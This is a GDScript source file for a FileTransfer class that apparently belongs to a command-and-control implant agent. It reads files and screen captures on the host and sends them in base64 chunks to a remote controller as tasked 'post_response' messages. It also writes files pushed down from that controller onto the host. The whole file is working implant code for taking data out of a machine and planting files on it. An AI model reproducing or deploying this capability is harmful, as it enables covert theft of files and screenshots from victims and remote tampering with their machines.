extends Object

class_name FileTransfer

enum DIRECTION {UPLOAD, DOWNLOAD, SCREENSHOT}
enum STATUS {BEGIN, TRANSFER, COMPLETE, ERROR}

@export var state: STATUS = STATUS.BEGIN
const FileTransfer = preload("res://file_transfer.gd")
var is_screenshot = false
var transport
var task_id
var file_id
var file_path
var direction
var position
var file_handle = false
var file_size = 0
var chunk_size = 8192 # bytes per response payload
var chunk_count = 0
var chunk_num = 1
var next_chunk_please = false
var raw_data:PackedByteArray = []
var completed = false
var file_id_requested = false
var first_chunk_requested = false
var checkin_done = false

func debug():
	print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nTaskID: %s\nFileId: %s\nFilePath: %s\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n" % [task_id, file_id, file_path])

func _init(taskId, filePath, fileDirection, Transport, fileId = "", rawData:PackedByteArray=[], isFromScreenshot=false):
	task_id = taskId

	if isFromScreenshot:
		# file_path is the screen index to capture
		file_path = filePath
	else:
		# we're uploading/downloading data
		file_path = filePath.simplify_path()

	direction = fileDirection
	transport = Transport
	file_id = fileId

	#only if we're doing random data upload (recording, http)
	raw_data = rawData

	is_screenshot = isFromScreenshot

func process():
	print("FileTransfer Process: ", file_path, "\n", task_id, "\n===================================================================================\n")

	if direction == DIRECTION.DOWNLOAD or direction == DIRECTION.SCREENSHOT:
		process_download()
	
	if direction == DIRECTION.UPLOAD:
		process_upload()

func process_upload():

	if not first_chunk_requested:
		first_chunk_requested = true

		completed = true

		file_size = 0

		print("\nUpload _process: ", file_path)

		# TODO: bail if we can't read the file and return this status / info

		file_handle = FileAccess.open(file_path , FileAccess.WRITE)

		if file_handle.is_open():
			file_path = file_handle.get_path_absolute()

			completed = false
			state = STATUS.BEGIN
		else:
			state = STATUS.ERROR

		transport.send(
			JSON.stringify({
				"action": "post_response",
				"responses": [{
					"upload": {
						"chunk_size": chunk_size,
						"file_id": file_id,
						"chunk_num": chunk_num,
						"full_path": file_path,
					},
					"task_id": task_id,
				}]
			})
		)

func process_upload_chunk(response):

	if response.get("status") and response.get("status") == "error":
		print("something went wrong...", response.get("error"))
		state = STATUS.ERROR
		completed = true
	else:
		if file_handle.is_open():
			state = STATUS.TRANSFER
			file_handle.store_buffer(Marshalls.base64_to_raw(response.get("chunk_data")))
			chunk_num += 1

			if response.get("total_chunks") <= response.get("chunk_num"): # TODO: better end state detection?
				completed = true
				state = STATUS.COMPLETE
				return

			transport.send(
				JSON.stringify({
					"action": "post_response",
					"responses": [{
						"task_id": task_id,
						"upload": {
							"chunk_size": chunk_size,
							"file_id": file_id,
							"chunk_num": chunk_num,
							"full_path": file_path,
						}
					}]
				})
			)
		else:
			state = STATUS.ERROR
			pass # TODO: response with error state

func process_download():
	if not file_id_requested:
		var user_output = ""
		var extra = 0

		completed = true
		file_id_requested = true

		file_size = 0
		position = 0

		print("\nDownload _process: ", file_path)
		
		if is_screenshot:
			print("\nScreenshot _process monitor: ", file_path)

		if raw_data.size() > 0:
			file_size = raw_data.size()

			if file_size % chunk_size > 0:
				extra = 1
			chunk_count = int(file_size / chunk_size) + extra
		else:
			file_handle = FileAccess.open(file_path , FileAccess.READ)
			var error = -1

			if file_handle != null and file_handle.is_open():
				file_path = file_handle.get_path_absolute()
				file_size = file_handle.get_length()
				
				state = STATUS.BEGIN
			else:
				state = STATUS.ERROR
				
				if file_handle != null:
					error = file_handle.get_error()

				user_output = "Error code: %d\nFile: %s" % [error, file_path]

			if file_size > 0:
				if file_size % chunk_size > 0:
					extra = 1
				chunk_count = int(file_size / chunk_size) + extra
				user_output = "File size: %d\nFullpath: %s\n" % [file_size, file_path]
			else:
				user_output = "Error zero byte file...\nFile: %s\n" % [file_path]

		transport.send(
			JSON.stringify({
				"action": "post_response", 
				"responses": [{
					"task_id": task_id,
					"user_output": user_output,
					"download": {
						"total_chunks": chunk_count,
						"full_path": file_path,
						"chunk_size": chunk_size,
						"is_screenshot": is_screenshot,
					}
				}]
			})
		)

	if next_chunk_please:
		state = STATUS.TRANSFER
		next_chunk_please = false
		var chunk

		# if we're using a file_handle for data vs. in memory buffers
		if raw_data.size() <= 0:
			if not file_handle.is_open():
				print("_process_download_chunk failed - file_handle for %s is closed..." % file_path)
				return
			
			position = file_handle.get_position()

		if position < file_size:
			completed = false

			chunk_num = int(position/chunk_size) + 1
			var next_chunk_size = chunk_size
			
			if chunk_num >= int(file_size / chunk_size) + 1:
				completed = true
				state = STATUS.COMPLETE

			if position + chunk_size > file_size:
				next_chunk_size = file_size - position

			if raw_data.size() <=0:
				chunk = file_handle.get_buffer(next_chunk_size)
			else:
				chunk = PackedByteArray(raw_data.slice(position, position+next_chunk_size))
				position = position + next_chunk_size

			transport.send(
				JSON.stringify(
					{
						"action": "post_response",
						"responses": [{
								"task_id": task_id,
								"user_output": "%s processing - (%d / %d)\n" % [file_path, chunk_num, chunk_count],
								"download": {
									"chunk_num": chunk_num,
									"file_id": file_id,
									"chunk_data": Marshalls.raw_to_base64(chunk),
									"is_screenshot": is_screenshot,
								}
							}
						]
					}
				)
			)

func process_file_complete():
	completed = true

	if raw_data.size() <=0:
		file_handle.close()
	else:
		raw_data.clear()

	state = STATUS.COMPLETE

	if direction == DIRECTION.DOWNLOAD or direction == DIRECTION.SCREENSHOT:
		transport.send(
			JSON.stringify(
				{
					"action": "post_response",
					"responses": [{
							"task_id": task_id,
							"status": "success",
							"completed": completed,
							"user_output": "upload of %s complete!\n" % [file_path],
							"download": {
								"file_id": file_id,
								"is_screenshot": is_screenshot,
							}
						}
					]
				}
			)
		)

	if direction == DIRECTION.UPLOAD:	
		transport.send(
			JSON.stringify(
				{
					"action": "post_response",
					"responses": [{
							"task_id": task_id,
							"status": "success",
							"completed": completed,
							"upload": {
								"file_id": file_id,
							}
						}
					]
				}
			)
		)

func process_download_chunk(fileId):

	if fileId:
		file_id = fileId

	next_chunk_please = true
